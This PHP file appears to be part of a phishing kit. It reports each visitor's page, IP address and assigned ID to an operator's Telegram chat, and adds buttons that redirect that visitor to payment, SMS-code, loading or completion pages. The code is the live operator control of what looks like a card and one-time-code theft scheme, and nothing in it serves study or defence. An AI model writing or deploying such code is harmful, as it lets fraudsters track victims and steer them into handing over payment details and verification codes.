<?php
// === FONCTIONS TELEGRAM ===

function sendTelegramNotification($page) {
    $ip = getUserIP();
    $userId = saveUser($page);
    
    $message = "🔔 *Nouvelle Visite*\n\n";
    $message .= "📍 *Page:* `$page`\n";
    $message .= "🆔 *User ID:* `$userId`\n";
    $message .= "🌐 *IP:* `$ip`\n";
    $message .= "⏰ *Heure:* " . date('H:i:s');
    
    $keyboard = [
        [
            ['text' => '🏠 Inicio', 'callback_data' => "redirect_$userId|index"],
            ['text' => '🛍️ Tienda', 'callback_data' => "redirect_$userId|boutique"]
        ],
        [
            ['text' => '💳 Pago', 'callback_data' => "redirect_$userId|payment"],
            ['text' => '⏳ Cargando', 'callback_data' => "redirect_$userId|loader"]
        ],
        [
            ['text' => '📱 SMS', 'callback_data' => "redirect_$userId|sms"],
            ['text' => '⏳ Cargando2', 'callback_data' => "redirect_$userId|loader2"]
        ],
        [
            ['text' => '✅ Completado', 'callback_data' => "redirect_$userId|done"]
        ]
    ];
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];
    
    $ch = curl_init(TELEGRAM_API_URL . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramMessage($message) {
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init(TELEGRAM_API_URL . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
